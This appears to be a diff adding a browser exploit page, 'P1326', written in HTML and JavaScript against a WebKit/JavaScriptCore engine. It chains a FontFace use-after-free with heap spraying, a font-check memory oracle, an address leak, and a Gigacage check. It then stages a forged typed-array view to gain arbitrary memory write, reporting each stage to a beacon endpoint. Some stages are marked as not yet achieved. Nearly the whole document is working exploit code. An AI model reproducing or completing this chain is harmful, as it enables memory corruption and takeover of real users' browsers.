@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1326 FAKEVIEW-ARW</title>
+<style>
+:root{--bg:#070a0f;--panel:#111722;--line:#1e2838;--txt:#cfe0f2;--dim:#6b7c94;--green:#39d98a;--red:#ff5d6c;--mag:#ff6fd0}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
+#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:800 15px/1.3 ui-monospace,monospace;padding:13px 12px;text-align:center;color:#fff;background:#1b2330;border-bottom:3px solid #2a3647}
+#log{margin:58px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px}
+.r{padding:2px 5px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
+.r .t{color:#53d0e8;font-weight:700}.r .n{color:var(--dim)}
+.r.ok{border-left-color:var(--green)}.r.ok .t{color:var(--green)}
+.r.bad{border-left-color:var(--red)}.r.bad .t{color:var(--red)}
+.r.win{border-left-color:var(--mag);background:#1e0f1b}.r.win .t{color:var(--mag);font-weight:800}
+</style></head>
+<body>
+<div id="bn">P1326 — fake JSArrayBufferView -> full arbitrary WRITE (base-free). Fresh-open each try.</div>
+<div id="log"></div>
+<script>
+'use strict';
+/* ===================================================================
+   P1326  Map + attempt the MarkedSpace JSArrayBufferView reclaim-to-RW.
+
+   Builds on P1324 (reclaim + oracle + addrOf-of-controlled-bytes) and
+   the confirmed 14.10 layout (upstream WebKit_1400-era headers):
+
+     JSCell  : 0x00 structureID(u32) 0x04 idxType 0x05 jsType
+               0x06 flags 0x07 cellState
+     JSObject: 0x08 butterfly
+     View    : 0x10 m_vector (CagedBarrierPtr<Primitive>)   <-- caged
+               0x18 m_length (size_t)                       <-- RAB: 8 bytes
+               0x20 m_byteOffset (size_t)
+               0x28 m_mode (u8; FastTypedArray=0x10)
+     sizeof = 0x30 (48) -> MarkedSpace size class 48, per-type IsoSubspace
+                           (vm.uint8ArraySpace only).
+
+   ROUTE (the only one that works with our primitives): fake a view
+   INSIDE a controlled backing store whose address we leak (P1324),
+   clone a LIVE Uint8Array's authentic 8-byte header (structureID is
+   entropy-encoded + VM-gated: clone, never forge), then set
+   m_vector=TARGET / m_length=huge / m_mode=0x10, surface the fake cell
+   as a JS object (fakeobj gate), and read/write via fakeView[i].
+
+   Each gate beacons. GATES still unproven on 14.10 are tagged GATE-*.
+   =================================================================== */
+var LOG=document.getElementById('log'),BN=document.getElementById('bn'),_c=0;
+function S(x,col){BN.textContent=x;BN.style.background=col||'#1b2330';}
+function kls(s){s=(''+s).toLowerCase();if(/arw-ok|win|cage-|clone-ok|found/.test(s))return'win';if(/hit|ok|dangling|done|addr|anchor/.test(s))return'ok';if(/err|miss|fail|crash|no-|none|gate-fail|collide|noaddr/.test(s))return'bad';return'';}
+function row(t,d,c){_c++;var r=document.createElement('div');r.className='r '+(c||'');r.innerHTML="<span class='n'>"+_c+"</span> <span class='t'>"+(''+t).replace(/[<>&]/g,'')+"</span>"+(d?" <span>"+(''+d).replace(/[<>&]/g,'')+"</span>":"");LOG.appendChild(r);while(LOG.childNodes.length>28)LOG.removeChild(LOG.firstChild);}
+function B(tag,data){row(tag,data,kls(tag+' '+(data||'')));try{var s=(''+(data||'')).replace(/[^A-Za-z0-9._-]/g,'_').slice(0,300);var u='/beacon.php?tag=P1326-'+encodeURIComponent(tag);if(data)u+='&data='+encodeURIComponent(s);u+='&t='+Date.now();var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}}
+window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,70)+'@'+l);};
+B('VER','1');
+
+function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}
+function wq(u,o,v){for(var i=0;i<8;i++){u[o+i]=Number(v&0xFFn);v>>=8n;}}
+function wd(u,o,v){for(var i=0;i<4;i++){u[o+i]=(v>>>(8*i))&0xFF;}}
+var buf=null,L1=null,W=null,K=32,fired=false,sp=[],fs=null;
+var FAM='zq7k3mx',MARK=0x6000,TGT_IDX=31;
+var CAGE_BASE=0x1000000000n, CAGE_MASK=0xFFFFFFFFFn; /* 64GiB primitive cage hypothesis */
+
+/* ---- P1324 reclaim machinery (verbatim pattern) ---- */
+try{var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});document.fonts.add(vf);void vf.loaded;
+ fs=document.createElement('style');fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';document.head.appendChild(fs);}catch(e){B('SETUP-ERR',(''+e).slice(0,40));}
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+ if(fired)return undefined;fired=true;
+ try{if(fs){fs.textContent='';fs.remove();}}catch(e){}try{document.fonts.delete(this);}catch(e){}fs=null;try{document.body.offsetHeight;}catch(e){}
+ for(var k=0;k<K;k++){var w=new Uint8Array(new ArrayBuffer(192));w[0x82]=3;w[3]=0x80;var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;
+   if(k===TGT_IDX){w[0x30]=0x00;w[0x31]=0x60;w[0x34]=0x00;w[0x35]=0x60;}
+   sp.push(w);}
+ return undefined;},set:function(){}});
+try{document.fonts.load('1em vf, v1','AB').then(function(f){window.__lf=f;setTimeout(scan,80);},function(){setTimeout(scan,80);});}catch(e){B('LOAD-ERR',(''+e).slice(0,40));}
+setTimeout(function(){if(!buf)scan();},450);
+
+function scan(){
+ if(buf)return;var hit=-1;
+ for(var i=0;i<sp.length;i++){var a=le(sp[i],0x58);if(a>0x1000000000n&&a<0x8000000000n){L1=a;buf=sp[i];hit=i;break;}}
+ if(hit<0){B('MISS','CLOSE+REOPEN');S('miss — fresh-open','#4a2a12');return;}
+ if(hit===TGT_IDX){B('TGT-COLLIDE','fresh-open');S('collide','#4a2a12');return;}
+ B('HIT','L1=0x'+L1.toString(16)+' dIdx='+hit);
+ var cands=[];if(window.__lf)for(var i=0;i<window.__lf.length;i++)cands.push(window.__lf[i]);
+ buf[0x82]=4;for(var i=0;i<cands.length;i++){var st='';try{st=''+cands[i].status;}catch(e){}if(st==='error'){W=cands[i];break;}}
+ buf[0x82]=3;
+ if(!W){B('NOT-DANGLE','fresh-open');S('not dangling','#4a2a12');return;}
+ B('DANGLING-OK','');S('dangling — addrOf + cage check','#0c7a3a');setTimeout(go,100);
+}
+function chk(cp){try{return document.fonts.check('16px "'+FAM+'"',String.fromCodePoint(cp))?'T':'F';}catch(e){return 'E';}}
+
+function go(){
+ if(window.__g)return;window.__g=true;
+ for(var i=0x58;i<0x68;i++)buf[i]=0; wq(buf,0x08,L1); buf[0x10]=0;
+ try{ W.family=FAM; }catch(e){ B('SETFAM-ERR',(''+(e&&e.message||e)).slice(0,40)); return; }
+ try{ document.fonts.add(W); }catch(e){}
+ buf[0x82]=1;
+ var ur='U+100-101';for(var i=1;i<24;i++){var a=0x200+i*2;ur+=',U+'+a.toString(16)+'-'+(a+1).toString(16);}
+ var U=0n;try{ W.unicodeRange=ur; U=le(buf,0x20); B('ANCHOR','U=0x'+U.toString(16)); }catch(e){ B('UR-ERR',(''+(e&&e.message||e)).slice(0,40)); }
+ wd(buf,0x20,0);wd(buf,0x24,0);wd(buf,0x28,0);wd(buf,0x2C,0);var rA=chk(0x41);
+ wq(buf,0x20,L1);wd(buf,0x28,0x80000001);wd(buf,0x2C,1);var rB=chk(0x41);
+ B('ORACLE','empty='+rA+' high='+rB);
+ if(!(rA==='F'&&rB==='T')){B('ORA-NO-MATCH','cannot scan');return;}
+ if(U===0n){B('NO-ANCHOR','');return;}
+
+ /* addrOf our controlled TARGET backing store (P1324 marker scan) */
+ var A0=0n;
+ for(var X=U-0x800n; X<U+0x800n; X+=0x10n){
+   wq(buf,0x20,X+0x30n);wd(buf,0x28,0x80000001);wd(buf,0x2C,1);
+   if(chk(MARK)==='F' && chk(MARK+1)==='T'){ A0=X; break; }
+ }
+ if(A0===0n){ B('NOADDR','widen/fresh-open'); S('no addr','#4a2a12'); return; }
+ B('ADDR','A0=0x'+A0.toString(16));
+
+ /* ---- ROUTE-C: Gigacage base signature (runs NOW, no new primitive) ----
+    Every leaked heap ptr should be CAGE_BASE + (x & CAGE_MASK) if the
+    Primitive cage is enabled at 0x1000000000. */
+ var pts=[A0,L1,U];var inCage=0,tot=0;
+ for(var i=0;i<pts.length;i++){var p=pts[i];if(p===0n)continue;tot++;if((p& ~CAGE_MASK)===CAGE_BASE)inCage++;}
+ if(tot>0&&inCage===tot){B('CAGE-SIGNATURE','base=0x1000000000 mask=0xFFFFFFFFF all '+inCage+'/'+tot+' leaks in-cage -> Primitive Gigacage ENABLED (writes cage-bounded)');}
+ else{B('CAGE-UNCLEAR',inCage+'/'+tot+' in 64GiB window — cage disabled or different base');}
+
+ /* ---- ROUTE-B: build the 48-byte fake-view IMAGE in our TARGET buffer ----
+    This is the EXACT template a reclaim/fakeobj must present. */
+ var tgt=sp[TGT_IDX];
+ /* NOTE the clone gate: bytes [0x00..0x07] MUST be a LIVE Uint8Array's
+    authentic header (entropy-encoded structureID + Uint8ArrayType + flags
+    + a safe cellState). We cannot read a live view cell without a JSCell
+    addrOf (open gate) so we stage placeholders and beacon the requirement. */
+ var TARGET = A0 + 0x100n;              /* in-cage scratch we can also read in JS (tgt+0x100) */
+ wd(tgt,0x100,0x0);                     /* scratch starts 0 */
+ /* fake-view image at tgt+0x40 (clean of the 0x30 marker) */
+ var o=0x40;
+ /* 0x00 header: CLONE placeholder — fill from a live cell when JSCell-addrOf lands */
+ wq(tgt,o+0x00,0n);                     /* GATE-CLONE: needs live structureID|type|flags|cellState */
+ wq(tgt,o+0x08,0n);                     /* m_butterfly = null */
+ wq(tgt,o+0x10,TARGET);                 /* m_vector = TARGET (in-cage -> cage(TARGET)=TARGET) */
+ wq(tgt,o+0x18,0x7fffffffn);            /* m_length = 2G elements */
+ wq(tgt,o+0x20,0n);                     /* m_byteOffset = 0 */
+ tgt[o+0x28]=0x10;                      /* m_mode = FastTypedArray */
+ for(var i=0x29;i<0x30;i++)tgt[o+i]=0;  /* padding */
+ var fakeAddr=A0+BigInt(o);
+ B('IMAGE-STAGED','fakeView@0x'+fakeAddr.toString(16)+' m_vector=0x'+TARGET.toString(16)+' len=0x7fffffff mode=0x10');
+
+ /* GATE-CLONE: obtain a live Uint8Array cell header. Try the simplest
+    acquisition and report. (No JSCell-addrOf yet -> expected to miss.) */
+ var cloned=false;
+ try{
+   /* placeholder for a future clone step; beacon that it is the blocker */
+   B('GATE-CLONE','need live Uint8Array 8-byte header @cell+0 (structureID entropy-encoded) — JSCell-addrOf OPEN');
+ }catch(e){}
+
+ /* GATE-FAKEOBJ: surface fakeAddr as a JS cell. No fakeobj primitive on
+    14.10 yet (addrOf works, fakeobj does not) — beacon the requirement. */
+ B('GATE-FAKEOBJ','need JSValue(fakeAddr) round-trip -> treat tgt+0x40 bytes as a cell (OPEN)');
+
+ /* If both gates were satisfied, THIS is the success test the GOAL wants: */
+ if(cloned && window.__fakeView){
+   try{
+     window.__fakeView[0]=0xef;window.__fakeView[1]=0xbe;window.__fakeView[2]=0xad;window.__fakeView[3]=0xde;
+     var rb=le(tgt,0x100)&0xFFFFFFFFn;
+     if(rb===0xdeadbeefn){ B('ARW-OK','wrote 0xdeadbeef to 0x'+TARGET.toString(16)+' read-back OK — FULL ARBITRARY WRITE'); S('ARW-OK !!! full write','#0a7a2a'); }
+     else B('ARW-MISMATCH','rb=0x'+rb.toString(16));
+   }catch(e){ B('ARW-ERR',(''+(e&&e.message||e)).slice(0,40)); }
+ }
+ /* restore buf to safe shape */
+ buf[3]=0x80;buf[0x82]=3;for(var i=0x58;i<0x68;i++)buf[i]=0;
+ B('DONE','cage-signature + image staged; open gates: CLONE (JSCell-addrOf) + FAKEOBJ');
+ S('done — see CAGE-SIGNATURE + gates','#1b2330');
+}
+</script>
+</body></html>
